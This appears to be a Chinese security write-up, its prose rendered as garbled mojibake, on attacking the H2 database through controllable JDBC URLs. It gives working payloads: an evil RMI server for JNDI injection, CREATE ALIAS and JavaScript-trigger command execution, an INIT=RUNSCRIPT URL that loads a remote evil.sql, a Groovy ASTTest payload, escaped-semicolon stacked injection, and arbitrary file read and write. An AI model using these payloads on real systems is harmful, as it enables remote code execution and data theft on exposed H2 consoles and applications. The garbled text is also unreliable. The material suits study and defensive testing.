# 0x00 Preface

JDBCæ˜¯JDKæä¾›çš„ä¸€ä¸ªç”¨äºè¿æ¥æ•°æ®åº“çš„æ¥å£(Java DataBase Connectivity)ï¼Œå„ä¸ªæ•°æ®åº“å‚å•†(MySQLã€Oracleã€SQLServer)è´Ÿè´£ç¼–å†™è‡ªå·±çš„JDBCå®ç°ç±»ï¼Œå†æŠŠè¿™äº›å®ç°ç±»æ‰“åŒ…ä¸ºé©±åŠ¨jaråŒ…ï¼Œæˆ‘ä»¬ä½¿ç”¨JDBCçš„æ¥å£ç¼–ç¨‹ï¼ŒèƒŒåè°ƒç”¨çš„å®åˆ™æ˜¯å®ç°ç±»é‡Œçš„æ–¹æ³•ã€‚

å¸¸è§çš„JDBCä½¿ç”¨æ–¹æ³•æ˜¯åœ¨é…ç½®æ–‡ä»¶ä¸­å†™å¥½JDBCå¼•æ“ã€è¿æ¥æ•°æ®åº“çš„URLã€è´¦æˆ·ã€å¯†ç 

```java
String JDBC_URL = "jdbc:mysql://localhost:3306/test";  //testæ•°æ®åº“
String JDBC_USER = "root";
String JDBC_PASSWORD = "password";
// å»ºç«‹è¿æ¥
Connection conn = DriverManager.getConnection(JDBC_URL, JDBC_USER,
JDBC_PASSWORD);
// TODO: è®¿é—®æ•°æ®åº“
// å…³é—­è¿æ¥
conn.close();
```

ä¹‹å‰åœ¨å­¦MySQLçš„JDBCæ”»å‡»æ‰‹æ³•å°±æœ‰è¿™ä¸ªç–‘æƒ‘äº†ï¼ŒJDBCè¿æ¥çš„URLæ€ä¹ˆèƒ½å¤Ÿè®©ç”¨æˆ·æ§åˆ¶å¾—åˆ°å‘¢?å®é™…åœ¨ä¸€äº›åœºæ™¯ä¸­ï¼Œæ¯”å¦‚åå°ä¿®æ”¹æ•°æ®åº“é…ç½®ã€æµ‹è¯•æ•°æ®åº“è¿æ¥ä¸­ï¼Œç®¡ç†å‘˜å°±å¯ä»¥æ§åˆ¶JDBCçš„è¿æ¥URLã€‚å› æ­¤è¿™ç±»æ¼æ´ä¸»è¦æ˜¯åœ¨åå°ç®¡ç†(å½“ç„¶ç¬¬ä¸€æ­¥å¾—æ”»è¿›åå°ï¼Œæœªæˆæƒã€å¼±å¯†é’¥ã€é€»è¾‘æ¼æ´ç­‰ç­‰ç­‰)ã€‚æœ¬æ–‡ä»‹ç»h2 databaseçš„ç›¸å…³æ¼æ´

H2æ˜¯ä¸€ä¸ªç”¨Javaç¼–å†™çš„æ•°æ®åº“ï¼Œæ”¯æŒå†…å­˜(æœ‰ç‚¹åƒsqlite)ã€æ–‡ä»¶ç­‰æ¨¡å¼ï¼Œåªæœ‰ä¸€ä¸ªjaræ–‡ä»¶ï¼Œé€‚åˆä½œä¸ºåµŒå…¥å¼æ•°æ®åº“ä½¿ç”¨ã€‚ä¸»è¦ç”¨äºå•å…ƒæµ‹è¯•ã€‚H2æä¾›äº†ä¸€ä¸ªwebæ§åˆ¶å°ç”¨äºæ“ä½œå’Œç®¡ç†æ•°æ®åº“ã€‚

# 0x01 Getting Started in h2

h2 database consoleå¯ä»¥æ•´åˆåˆ°SpringBootä¸­ï¼Œä¹Ÿå¯ä»¥ç‹¬ç«‹å¯åŠ¨(å…¶å†…ç½®äº†ä¸€ä¸ªWebServer)

H2æ”¯æŒè¿è¡Œä¸‰ç§æ¨¡å¼ï¼š

Embedded(åµŒå…¥å¼)->æ— éœ€é…ç½®æœ¬åœ°/è¿œç¨‹æ•°æ®åº“; æ•°æ®åº“è¿æ¥å…³é—­æ—¶, æ•°æ®ä¸è¡¨ç»“æ„ä¾ç„¶å­˜åœ¨;

In-Memory(å†…å­˜æ¨¡å¼)->æ— éœ€é…ç½®æœ¬åœ°/è¿œç¨‹æ•°æ®åº“, ä½†æ•°æ®åº“è¿æ¥å…³é—­æ—¶ï¼Œæ•°æ®ä¸è¡¨ç»“æ„ä¸¢å¤±;

ServerMode(ä¼ ç»Ÿæ¨¡å¼)->éœ€è¦é…ç½®æœ¬åœ°/è¿œç¨‹æ•°æ®åº“;

## jarå¯åŠ¨

åœ¨[å®˜ç½‘](http://www.h2database.com/html/cheatSheet.html)ä¸‹è½½jaråŒ…ï¼Œè°ƒç”¨é‡Œé¢çš„`org.h2.tools.Server`ç±»

`java -cp .\h2-2.2.220.jar org.h2.tools.Server -help`

![image-20230809182130728](./../.gitbook/assets/image-20230809182130728.png)

`java -cp .\h2-2.2.220.jar org.h2.tools.Server -web -webAllowOthers`

å¯åŠ¨Web consoleï¼Œé»˜è®¤ç›‘å¬8082ç«¯å£

H2çš„Web consoleä¸ä»…å¯ä»¥è¿æ¥H2æ•°æ®åº“ï¼Œä¹Ÿå¯ä»¥è¿æ¥å…¶ä»–æ”¯æŒJDBC APIçš„æ•°æ®åº“

![image-20230809182742838](./../.gitbook/assets/image-20230809182742838.png)

H2æ•°æ®åº“é»˜è®¤ç”¨æˆ·åä¸ºsaã€å¯†ç ä¸ºç©º

![image-20230809184419915](./../.gitbook/assets/image-20230809184419915.png)

## Springbootæ•´åˆ

å¼•å…¥pomä¾èµ–

```xml
<dependency>
    <groupId>com.h2database</groupId>
    <artifactId>h2</artifactId>
</dependency>

<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-data-jpa</artifactId>
</dependency>

<dependency>
    <groupId>org.projectlombok</groupId>
    <artifactId>lombok</artifactId>
</dependency>
```

åœ¨`application.properties`ä¸­æ·»åŠ h2è¿æ¥çš„é…ç½®

```xml
spring.datasource.driver-class-name=org.h2.Driver
spring.datasource.url=jdbc:h2:mem:test
spring.datasource.username=sa
spring.datasource.password=

spring.h2.console.enabled=true
spring.h2.console.path=/h2
spring.h2.console.settings.trace=false
spring.h2.console.settings.web-allow-others=true
```

æ³¨æ„è¿™é‡Œspringbootå¯ä»¥ä¿®æ”¹h2 consoleçš„è®¿é—®è·¯å¾„ï¼Œè‹¥æœªé…ç½®æ­¤é¡¹é»˜è®¤ä¸º`h2-console`

ç®€å•å†™ä¸ªdemo

```java
package com.demo.h2.Entity;

import lombok.Data;
import javax.persistence.*;

@Entity
@Table(name = "t_user")
@Data
public class User {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    private String name;
    private int age;

    @Override
    public String toString() {
        return "User{" +
                "id=" + id +
                ", name='" + name + '\'' +
                ", age=" + age +
                '}';
    }
}
```

```java
package com.demo.h2.repository;

import com.demo.h2.Entity.User;
import org.springframework.data.jpa.repository.JpaRepository;

public interface UserRepository extends JpaRepository<User, Integer> {}
```

```java
package com.demo.h2.controller;

import com.demo.h2.Entity.User;
import com.demo.h2.repository.UserRepository;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.util.Assert;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

@Slf4j
@RestController
public class HelloController {
    @Autowired
    private UserRepository userRepository;

    @GetMapping("/user/create")
    public String createUser(){
        User user = new User();
        user.setName("taco");
        user.setAge(18);
        User result = userRepository.save(user);
        Assert.notNull(user.getId(), "Id Is Null");
        return result.toString();
    }
}
```

è®¿é—®`/user/create`åˆ›å»ºç”¨æˆ·

è®¿é—®`/h2`æ§åˆ¶å°

![image-20230809204935288](./../.gitbook/assets/image-20230809204935288.png)

![image-20230809205627851](./../.gitbook/assets/image-20230809205627851.png)

# 0x02 h2 JNDI

```java
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;


public class EvilRMIServer {
    public static void main(String[] args) throws Exception {
        Registry r = LocateRegistry.createRegistry(8025);
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','touch /tmp/h2-jndi-success']).start()\")"));
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        r.bind("evil",referenceWrapper);
        System.out.println("running");
    }
}
```

![image-20230810093657541](./../.gitbook/assets/image-20230810093657541.png)

é«˜ç‰ˆæœ¬çš„H2åªå…è®¸JNDI lookupçš„URLä»¥javaå¼€å¤´

![image-20230810111614358](./../.gitbook/assets/image-20230810111614358.png)

ç¿»äº†ä¸€ä¸‹H2çš„å‡½æ•°æ–‡æ¡£ï¼Œå‘ç°ä¸€å¤„å¯èƒ½é€ æˆJNDIæ³¨å…¥çš„ã€‚`LINK_SCHEMA`

http://www.h2database.com/html/functions.html#link_schema

![image-20230810111117389](./../.gitbook/assets/image-20230810111117389-1691679021218-1.png)

```
SELECT * FROM LINK_SCHEMA('p4d0rn', 'javax.naming.InitialContext', 'rmi://127.0.0.1:8025/evil', 'p4d0rn', 'p4d0rn', 'PUBLIC');
```

åŒæ ·é«˜ç‰ˆæœ¬å¯¹URLè¿›è¡Œäº†é™åˆ¶ï¼Œåªå…è®¸javaå¼€å¤´

# 0x03 h2 RCE

JNDIæ³¨å…¥å—åˆ°ä¸å‡ºç½‘çš„é™åˆ¶ï¼Œèƒ½å¦ç›´æ¥æ‰§è¡Œå‘½ä»¤å‘¢

## UDFæ‰§è¡Œ

* `CREATE ALIAS`

è‡ªå®šä¹‰å‡½æ•°

åˆ›å»ºä¸€ä¸ªshellå‡½æ•°å¹¶è°ƒç”¨

```sql
DROP ALIAS IF EXISTS shell;
CREATE ALIAS shell AS $$void shell(String s) throws Exception {
	java.lang.Runtime.getRuntime().exec(s);
}$$;
SELECT shell('cmd /c calc');
```

h2ä¸­ä¸¤ä¸ª`$`è¡¨ç¤ºæ— éœ€è½¬ä¹‰çš„é•¿å­—ç¬¦ä¸²

![image-20230810100610909](./../.gitbook/assets/image-20230810100610909.png)

è¿”å›æ‰§è¡Œç»“æœ:

```sql
CREATE ALIAS SHELLEXEC AS $$String shellexec(String cmd) throws java.io.IOException{
	java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); 
	return s.hasNext() ? s.next() : ""; 
}$$;

CALL SHELLEXEC('whoami');
```

![image-20230810100825693](./../.gitbook/assets/image-20230810100825693.png)

### å‘ï¼šlombokç¼–è¯‘ä¹‹æ®‡

é¡¹ç›®ä¸­ä½¿ç”¨äº†lombokï¼Œå¯¼è‡´H2åŠ¨æ€ç¼–è¯‘çš„ç±»æ— æ³•åŠ è½½ã€‚æ¢æˆé«˜ç‰ˆæœ¬çš„H2å°±å¯ä»¥äº†ï¼ˆä¸€å¼€å§‹è¿˜ä»¥ä¸ºæ˜¯ä½ç‰ˆæœ¬æ— æ³•ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ã€‚ã€‚ã€‚ï¼‰

ä¸‹é¢çœ‹ä¸€ä¸‹ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°çš„è¿‡ç¨‹ğŸ™„

è¿è¡Œå¦‚ä¸‹SQL

```sql
CREATE ALIAS PRINT AS $$ void print(String s) {
    System.out.println(s); } $$;
```

`org.h2.command.ddl.CreateFunctionAlias#update`

![image-20230810145651068](./../.gitbook/assets/image-20230810145651068.png)

è·Ÿè¿›`FunctionAlias#newInstanceFromSource`

![image-20230810145914667](./../.gitbook/assets/image-20230810145914667.png)

è·Ÿè¿›`init`ï¼Œæ³¨é‡Šè¯´ä¼šå°è¯•ç¼–è¯‘ç±»ï¼Œæ¥ç€è¿›å…¥`loadFromSource`

![image-20230810150159093](./../.gitbook/assets/image-20230810150159093.png)

å°†åˆ«åå’Œ`org.h2.dynamic`è¿›è¡Œæ‹¼æ¥ï¼Œå¾—åˆ°ä¸€ä¸ªå…¨ç±»å

![image-20230810150412707](./../.gitbook/assets/image-20230810150412707.png)

ä¸‹é¢çš„`compilier.setSource`å°±æ˜¯æŠŠå…¨ç±»åå’Œè‡ªå®šä¹‰å‡½æ•°çš„ä»£ç æ”¾å…¥ä¸€ä¸ªsourceæˆå‘˜(ä¸€ä¸ªé”®å€¼å‡ä¸ºStringçš„HashMap)

æ¥ç€è¯•å›¾åŠ è½½è¿™ä¸ªæ‹¼æ¥çš„å…¨ç±»åï¼Œå¹¶è·å–ç¬¬ä¸€ä¸ªå…¬å¼€çš„é™æ€æ–¹æ³•ï¼Œä¸”ä¸ä»¥`_`æˆ–`main`å¼€å¤´

![image-20230810150806183](./../.gitbook/assets/image-20230810150806183.png)

è¿›å…¥`getClass`

![image-20230810154754442](./../.gitbook/assets/image-20230810154754442.png)

ä»`compiled`ç¼–è¯‘è¿‡çš„ç±»ä¸­å°è¯•è·å–ï¼Œç„¶åè‡ªå®šä¹‰äº†ä¸€ä¸ª`Classloader`ç±»åŠ è½½å™¨ï¼Œé‡å†™äº†`findClass`æ–¹æ³•

![image-20230810155131958](./../.gitbook/assets/image-20230810155131958.png)

`getCompleteSourceCode`æ„é€ å‡ºå®Œæ•´çš„ä¸€ä¸ªç±»çš„ä»£ç (é¦–è¡Œå£°æ˜åŒ…åã€ç±»å£°æ˜ã€æ–¹æ³•åŠ ä¸Špublicã€staticä¿®é¥°ç¬¦)

![image-20230810152333492](./../.gitbook/assets/image-20230810152333492.png)

å›é€€åˆ°`findClass`ï¼Œè·Ÿè¿›`javaxToolsJavac`ç”¨äºç¼–è¯‘ã€åŠ è½½ç±»

![image-20230810160713450](./../.gitbook/assets/image-20230810160713450.png)

ç”¨äº†lombokè¿™é‡Œæœºä¼šäº§ç”Ÿé”™è¯¯ä¿¡æ¯ï¼Œè¿›å…¥`handleSyntaxError`æŠ¥é”™

å¯¹æ¯”é«˜ç‰ˆæœ¬çš„H2ï¼Œ`handleSyntaxError`å¤šä¼ äº†ä¸€ä¸ªå‚æ•°ï¼Œè‹¥ç¬¬äºŒä¸ªå‚æ•°æ˜¯0åˆ™ç›´æ¥è¿”å›ï¼Œä¸è¿›è¡Œè¯­æ³•é”™è¯¯å¤„ç†

`handleSyntaxError*(output, (ok? 0: 1));`

é‚£å¦‚æœé‡ä¸Šç›®æ ‡ç”¨äº†lombokè¿˜æ˜¯H2ä½ç‰ˆæœ¬å‘¢?åªèƒ½è€ƒè™‘è°ƒç”¨ç›®æ ‡æœ¬åœ°çš„é™æ€å…¬å¼€æ–¹æ³•

å¦‚`com.sun.org.apache.xml.internal.security.utils.JavaUtils`æœ‰ä¸¤ä¸ªè¯»å†™æ–‡ä»¶çš„é™æ€å…¬å¼€æ–¹æ³•

```sql
CREATE ALIAS read FOR 'com.sun.org.apache.xml.internal.security.utils.JavaUtils.getBytesFromFile';
SELECT read('E:/flag.txt');
```

![image-20230810163716096](./../.gitbook/assets/image-20230810163716096.png)

è¯»å‡ºæ¥çš„ç»“æœä¸ºbyteæ•°ç»„ï¼Œè¿˜å¾—è½¬ä¸ºå­—ç¬¦ä¸²

```java
byte[] bytes = {0x68, 0x65, 0x72, 0x65, 0x20, 0x69, 0x73, 0x20, 0x6d, 0x79, 0x20, 0x66, 0x6c, 0x61, 0x67};
System.out.println(new String(bytes));  // æ‰“å°here is my flag
```

è™½ç„¶`writeBytesToFilename`ç¬¬äºŒä¸ªå‚æ•°è¦æ±‚ä¸ºbyteæ•°ç»„ï¼Œä½†ä¼ å­—ç¬¦ä¸²ä¹Ÿè¡Œï¼ŒH2èƒ½å¤Ÿè‡ªåŠ¨è½¬æ¢ã€‚æˆ–è€…åœ¨åå…­è¿›åˆ¶å­—ç¬¦ä¸²å‰é¢åŠ ä¸ªXã€‚

```sql
CREATE ALIAS write FOR 'com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename';
SELECT write('E:/success.txt', 'Arbitrary File Write');
SELECT write('E:/wirte_hex.txt', X'68657265206973206d7920666c6167')
```

![image-20230810164626253](./../.gitbook/assets/image-20230810164626253.png)

å½“ç„¶è¿˜æœ‰å…¶ä»–é™æ€æ–¹æ³•å¯ä»¥åˆ©ç”¨ï¼Œæ¯”å¦‚

* `java.sql.DriverManager#getConnection` è¿æ¥æ¶æ„MySQLæœåŠ¡å™¨
* `javax.naming.InitialContext#doLookup` JNDIæ³¨å…¥
* `com.alibaba.fastjson.JSON#parseObject` FastJsonååºåˆ—åŒ–
* `org.springframework.util.SerializationUtils.deserialize` äºŒæ¬¡ååºåˆ—åŒ–

å’³å’³ï¼Œæ‰¯è¿œäº†ï¼Œç»§ç»­å›åˆ°H2 RCEã€‚

## jsæ‰§è¡Œ

* `CREATE TRIGGER`

è¿™ä¸ªå‘½ä»¤ç¨å¾®éº»çƒ¦ä¸€ç‚¹ï¼Œåˆ©ç”¨çš„æ˜¯è§¦å‘å™¨ï¼Œå³å¢åˆ æ”¹æ—¶ä¼šè§¦å‘ä¸€äº›åŠ¨ä½œï¼Œéœ€è¦æ–°å»ºä¸€å¼ è¡¨ï¼Œæˆ–è€…éœ€è¦æœ‰å·²çŸ¥è¡¨ã€‚

ä¸‹é¢ä¸Šç½‘ä¸Šæµä¼ çš„poc

```sql
CREATE TABLE hack (
     id INT NOT NULL
);

CREATE TRIGGER TRIG_JS AFTER INSERT ON hack AS '//javascript
Java.type("java.lang.Runtime").getRuntime().exec("calc");';
 
INSERT INTO hack VALUES (1);
```

ä½†å®é™…ä¸Šåˆ›å»ºè§¦å‘å™¨æ—¶é‚£æ®µjsä»£ç å°±è¢«æ‰§è¡Œäº†ï¼Œåé¢æ’å…¥æ•°æ®ä¹Ÿæ²¡æœ‰æ‰§è¡Œ

å¥½åœ¨è¿™å¥åˆ›å»ºè§¦å‘å™¨çš„è¯­å¥å¯ä»¥å¤šæ¬¡æ‰§è¡Œ(å› ä¸ºæ ¹æœ¬æ²¡åˆ›å»ºæˆåŠŸ)

ä¸ºä»€ä¹ˆå‘¢ï¼Ÿå› ä¸ºè¿™æ®µjsä»£ç æœ¬æ„æ˜¯ç”¨æ¥è¿”å›ä¸€ä¸ª`Trigger`å¯¹è±¡çš„

æŸ¥çœ‹å®˜æ–¹æ–‡æ¡£https://www.h2database.com/html/commands.html#create_trigger

> The trigger class must be public and implement `org.h2.api.Trigger`. Inner classes are not supported. The class must be available in the classpath of the database engine (when using the server mode, it must be in the classpath of the server).
>
> The sourceCodeString must define a single method with no parameters that returns `org.h2.api.Trigger`. See `CREATE ALIAS` for requirements regarding the compilation. Alternatively, javax.script.ScriptEngineManager can be used to create an instance of `org.h2.api.Trigger`. Currently javascript (included in every `JRE`) and ruby (with `JRuby`) are supported. In that case the source must begin respectively with `//javascript` or `#ruby`.
>
> Example:
>
> CREATE TRIGGER TRIG_INS BEFORE INSERT ON TEST FOR EACH ROW CALL 'MyTrigger';
>
> CREATE TRIGGER TRIG_SRC BEFORE INSERT ON TEST AS
>   'org.h2.api.Trigger create() { return new MyTrigger("constructorParam"); }';
>
> CREATE TRIGGER TRIG_JS BEFORE INSERT ON TEST AS '//javascript
> return new Packages.MyTrigger("constructorParam");';
>
> CREATE TRIGGER TRIG_RUBY BEFORE INSERT ON TEST AS '#ruby
> Java::MyPackage::MyTrigger.new("constructorParam")';

å¯ä»¥ç”¨`javax.script.ScriptEngineManager`æ¥åˆ›å»ºä¸€ä¸ª`org.h2.api.Trigger`å®ä¾‹

`org.h2.schema.TriggerObject#loadFromSource`

![image-20230810182752759](./../.gitbook/assets/image-20230810182752759.png)

åˆ¤æ–­æ˜¯å¦ä¸ºjsæˆ–rubyè„šæœ¬

![image-20230810182816425](./../.gitbook/assets/image-20230810182816425.png)

ç®€å•åˆ¤æ–­æ˜¯å¦ä»¥`//javascript`å¼€å¤´

![image-20230810182917740](./../.gitbook/assets/image-20230810182917740.png)

ç„¶åå°±æ˜¯ç»å…¸çš„`new ScriptEngineManager().getEngineByName("javascript")`

![image-20230810183249317](./../.gitbook/assets/image-20230810183249317.png)

è¿”å›`CompiledScript`è°ƒç”¨å…¶`eval`

ä½ç‰ˆæœ¬H2(1.4.200ä¹‹å‰)è²Œä¼¼ä¸æ”¯æŒjsè„šæœ¬ï¼Œæ²¡æœ‰`isJavascriptSource`è¿™æ®µä»£ç 

## å‡ºç½‘åˆ©ç”¨â€”â€”init+runscript

ä¸Šé¢è¿™äº›æ“ä½œçš„åˆ©ç”¨å‰æéƒ½æ˜¯h2 consoleæˆåŠŸè¿æ¥åˆ°æ•°æ®åº“ã€‚

ä½ç‰ˆæœ¬H2(`1.4.193`å·¦å³)å½“è¿æ¥çš„æ•°æ®åº“ä¸å­˜åœ¨æ—¶ä¼šè‡ªåŠ¨åˆ›å»ºï¼Œä½†é«˜ç‰ˆæœ¬å°±ä¸è¡Œäº†

ä¼šæŠ¥é”™`Database "mem:test" not found.either pre-create it or allow remote database creation`

è¦ä¹ˆè¿æ¥Springbootä¸­`spring.datasource.url`æŒ‡æ˜çš„æ•°æ®åº“ï¼Œè¦ä¹ˆéœ€è¦å¯åŠ¨consoleæ—¶å¸¦ä¸Š`-ifNotExists`å‚æ•°

å› æ­¤èƒ½å¦ä¸è¿æ¥è¿›å»å°±èƒ½æ‰§è¡Œå‘½ä»¤å‘¢?

h2æ•°æ®åº“çš„JDBC URLä¸­æ”¯æŒçš„ä¸€ä¸ªé…ç½®`INIT`

è¿™ä¸ªå‚æ•°è¡¨ç¤ºåœ¨è¿æ¥h2æ•°æ®åº“æ—¶ï¼Œä¼šæ‰§è¡Œä¸€æ¡åˆå§‹åŒ–å‘½ä»¤ã€‚ä¸è¿‡åªæ”¯æŒæ‰§è¡Œä¸€æ¡å‘½ä»¤ï¼Œè€Œä¸”ä¸èƒ½åŒ…å«åˆ†å·`;` 

ä¸Šé¢`CREATE ALIAS`ç”¨äºå‘½ä»¤æ‰§è¡Œçš„SQLè¯­å¥éƒ½ä¸æ­¢ä¸€æ¡ã€‚å¯ä»¥åˆ©ç”¨`RUNSCRIPT`å‘½ä»¤ã€‚`RUNSCRIPT`ç”¨äºæ‰§è¡Œä¸€ä¸ªSQLæ–‡ä»¶

```
jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://127.0.0.1:8888/evil.sql'
```

è¿™ä¸ªæ–¹æ³•èƒ½ç”¨åœ¨ä»»ä½•èƒ½é…ç½®JDBC URLä¸”ä¾èµ–äº†H2çš„åœ°æ–¹

![image-20230810170824027](./../.gitbook/assets/image-20230810170824027.png)

(URLè¿œç¨‹åŠ è½½)

## ä¸å‡ºç½‘åˆ©ç”¨â€”â€”init+groovy

JDBCè¿æ¥æ—¶`INIT`åªå…è®¸æ‰§è¡Œä¸€æ¡SQLå‘½ä»¤ï¼Œè€Œæˆ‘ä»¬çš„å‘½ä»¤æ‰§è¡Œæœ‰ä¸¤å¥ï¼Œä¸€å¥åˆ›å»ºUDFï¼Œä¸€å¥æ‰§è¡ŒUDF

é™¤éæœ‰å·²çŸ¥è¡¨ï¼Œä½¿ç”¨`CREATE TRIGGER`å°±åªéœ€ä¸€å¥ã€‚å®é™…ä¸Šå¯ä»¥åˆ©ç”¨H2çš„ç³»ç»Ÿè¡¨ï¼ŒH2å’ŒMySQLä¸€æ ·ä¹Ÿæœ‰`INFORMATION_SCHEMA`

> The system tables and views in the schema `INFORMATION_SCHEMA` contain the meta data of all tables, views, domains, and other objects in the database as well as the current settings.

```
jdbc:h2:mem:test;init=CREATE TRIGGER TRIG_JS AFTER INSERT ON INFORMATION_SCHEMA.TABLES AS '//javascript
Java.type("java.lang.Runtime").getRuntime().exec("calc")'
```

éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒH2æå–URLä¸­çš„é…ç½®æ—¶æ˜¯é€šè¿‡åˆ†å‰²åˆ†å·`;`æ¥æå–çš„ï¼Œ~~å› æ­¤JSä»£ç ä¸­ä¸èƒ½æœ‰åˆ†å·ï¼Œå¦åˆ™ä¼šæŠ¥é”™~~ï¼ˆå¯ä»¥åŠ ä¸Šåæ–œæ ä»£è¡¨è½¬ä¹‰ï¼‰

![image-20230810231831479](./../.gitbook/assets/image-20230810231831479.png)

è‹¥ç›®æ ‡ç¯å¢ƒæœ‰`Groovy`ä¾èµ–ï¼Œå¯ä»¥ä½¿ç”¨å…ƒç¼–ç¨‹çš„æŠ€å·§æ¥å‘½ä»¤æ‰§è¡Œï¼Œåœ¨ç¼–è¯‘`Groovy`è¯­å¥è€Œéæ‰§è¡Œæ—¶å°±æ‰§è¡Œæ”»å‡»è€…çš„ä»£ç ã€‚

æ·»åŠ `groovy-sql`ä¾èµ–

```xml
<dependency>
    <groupId>org.codehaus.groovy</groupId>
    <artifactId>groovy-sql</artifactId>
    <version>3.0.8</version>
</dependency>
```

```sql
jdbc:h2:mem:test;init=CREATE ALIAS shell2 AS
$$@groovy.transform.ASTTest(value={
assert java.lang.Runtime.getRuntime().exec("cmd.exe /c calc.exe")
})
def x$$
```

## SQLI 2 RCE

`INIT`å‚æ•°å¯ä»¥ç›´æ¥åœ¨è¿æ¥æ•°æ®åº“æ—¶æ‰§è¡Œåˆå§‹åŒ–çš„sqlè¯­å¥

é™¤äº†`INIT`å‚æ•°ï¼Œä¸€äº›å‚æ•°åœ¨è¿æ¥æ•°æ®åº“æ—¶ä¼šæ‰§è¡ŒSETå‘½ä»¤ï¼Œå­˜åœ¨SQLæ³¨å…¥

æ¯”å¦‚`TRACE_LEVEL_SYSTEM_OUT`ã€`TRACE_MAX_FILE_SIZE`......

![image-20230811095343295](./../.gitbook/assets/image-20230811095343295.png)

`org.h2.engine.Engine#openSession`ä¼šå¯¹æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°è¿›è¡Œ`SET`è¯­å¥æ‹¼æ¥

![image-20230811102607809](./../.gitbook/assets/image-20230811102607809.png)

å¼€å§‹å°è¯•å †å æ³¨å…¥

### å‘ï¼šsemicolonåˆ†å‰²ä¹‹ç—›

```
jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;CREATE TRIGGER TRIG_JS BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript
Java.type("java.lang.Runtime").getRuntime().exec("calc")$$--
```

è¿™ä¸ªpayloadå¹¶ä¸èƒ½æ‰“é€šï¼Œè¿˜å¾—çœ‹å®ƒæ˜¯æ€ä¹ˆæå–settingå‚æ•°çš„

`org.h2.engine.ConnectionInfo#readSettingsFromURL` è¿™ä¸ªç±»ç”¨äºå­˜å‚¨è¿æ¥ä¿¡æ¯

![image-20230811103427436](./../.gitbook/assets/image-20230811103427436.png)

é—®é¢˜å°±å‡ºåœ¨è¿™ï¼Œæˆ‘ä»¬ç”¨äºå †å æ³¨å…¥çš„åˆ†å·`;`ï¼ŒåŒæ—¶ä¹Ÿæ˜¯H2ç”¨æ¥æå–è®¾ç½®å‚æ•°çš„åˆ†éš”ç¬¦ã€‚ã€‚ã€‚ğŸ¥²

ä½†è¦æ˜¯settingsçš„å€¼æœ¬æ¥å°±å­˜åœ¨åˆ†å·æ€ä¹ˆåŠï¼Œç…§ç†æ˜¯ä¼šæä¾›è½¬ä¹‰çš„ï¼Œè·Ÿè¿›`StringUtils.arraySplit`ä¸€æ¢ç©¶ç«Ÿ

![image-20230811104152849](./../.gitbook/assets/image-20230811104152849.png)

æœç„¶æ˜¯æ”¯æŒåæ–œæ è½¬ä¹‰çš„ã€‚å› æ­¤åœ¨payloadä¸­åˆ†å·å‰é¢åŠ ä¸Š`\`å³å¯

```
jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=1\;CREATE TRIGGER TRIG_JS BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript
Java.type("java.lang.Runtime").getRuntime().exec("calc")$$--
```

# 0x04 Recap

æœ¬æ–‡ç®€å•ä»‹ç»äº†H2çš„JDBCæ”»å‡»æ–¹æ³•ï¼Œåœ¨JDBC URLå¯æ§çš„æƒ…å†µä¸‹ï¼ˆä¸å±€é™äºh2 web consoleï¼‰

* JNDIæ³¨å…¥ï¼ˆé«˜ç‰ˆæœ¬é™åˆ¶äº†åªèƒ½æ˜¯javaåè®®ï¼‰
* åˆ©ç”¨initå‚æ•°æ‰§è¡Œ`RUNSCRIPT`å‘½ä»¤åŠ è½½æ‰§è¡Œè¿œç¨‹æ¶æ„SQL
* åˆ©ç”¨initå‚æ•°ç›´æ¥æ‰§è¡Œ`groovy`å…ƒç¼–ç¨‹ä»£ç ï¼ˆä¸å‡ºç½‘ï¼‰
* åˆ©ç”¨å…¶ä»–è¿æ¥å‚æ•°è¿›è¡Œå †å æ³¨å…¥

å½“ç„¶è‹¥èƒ½ç›´æ¥è¿æ¥ä¸Šå»ï¼Œå°±èƒ½ç›´æ¥UDFå‘½ä»¤æ‰§è¡Œäº†ã€‚

è€Œå¯¹äºh2 web consoleï¼Œåˆ©ç”¨æ–¹å¼ä¼šå—åˆ°ä¸€äº›é™åˆ¶ï¼š

* éœ€è¦å¼€å¯`-webAllowOthers`é€‰é¡¹ï¼Œæ”¯æŒå¤–éƒ¨è¿æ¥
* éœ€è¦å¼€å¯`-ifNotExists`é€‰é¡¹ï¼Œæ”¯æŒåˆ›å»ºæ•°æ®åº“
